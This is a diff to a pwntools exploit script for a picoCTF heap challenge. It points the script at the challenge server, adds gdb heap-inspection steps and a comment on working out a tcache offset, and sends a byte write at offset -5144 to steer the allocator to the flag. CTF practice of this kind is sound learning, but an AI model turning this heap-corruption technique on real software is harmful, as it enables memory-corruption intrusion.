@@ -12,7 +12,7 @@ context.log_level = "CRITICAL"
 context.terminal = ["konsole", "-e"]
 
 LOCAL = "./heapedit_patched"
-REMOTE = ()
+REMOTE = ("mercury.picoctf.net", 34499)
 
 
 class Exploit:
@@ -21,18 +21,25 @@ class Exploit:
             self.process = "process()"
         else:
             self.process = "remote(REMOTE[0], REMOTE[1])"
-
         self.debug = debug
 
     def conn(self, proc: process):
         if self.debug:
-            script = """
-            """
+            script = "heap chunks\n"
+            script += "heap bins tcache\n"
+            '''
+            todo:
+                1. get chucks address of flag in heap+1
+                2. get chucks address of heap tcachebins
+                3. search address that pointer tchachebins (e.g. search-pattern \\x90\\x68\\x59\\x01)
+                3. heap_address of flag+1 - heap address of pointer tcachebin
+                4. example: p/d 0x1417088 - 0x14184a0 = -5144
+            '''
             gdb.attach(proc, gdbscript=script)
         proc.recvuntil(b"Address: ")
-        proc.sendline(pack("<Q", 0x7fffffffe068))
+        proc.sendline(b"-5144")
         proc.recvuntil(b"Value: ")
-        proc.sendline(b"1111")
+        proc.sendline(b"\x00")
         proc.interactive()
 
     def start(self):
@@ -41,4 +48,4 @@ class Exploit:
             self.conn(r)
 
 
-Exploit(local=True, debug=True).start()
+Exploit(local=False, debug=False).start()
